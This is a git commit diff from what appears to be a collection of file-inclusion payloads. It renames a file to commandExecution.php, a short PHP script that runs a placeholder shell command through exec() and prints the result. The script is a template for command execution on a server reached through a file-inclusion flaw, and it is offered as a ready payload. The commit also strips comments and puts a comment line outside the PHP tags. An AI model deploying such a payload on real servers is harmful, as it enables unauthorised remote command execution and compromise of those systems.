26fcc48b625059c34385d6c983df17c114721f6d
Paulo Mota <44026675+paulogmota@users.noreply.github.com>
2023-05-12 11:59:19 -0300

    Update and rename ptlabs.php to commandExecution.php

--- file-inclusion-payloads/commandExecution.php
+++ file-inclusion-payloads/commandExecution.php
@@ -1,10 +1,7 @@
+// Linux command execution. Must fork this 
 <?php
-    // Define the command to execute
     $command = 'INSERT COMMAND, PATH, SCRIPT HERE';
-
-    // Execute the command and get the output
     $output = exec($command);
-
     // Print the output
     echo $output;
 ?>
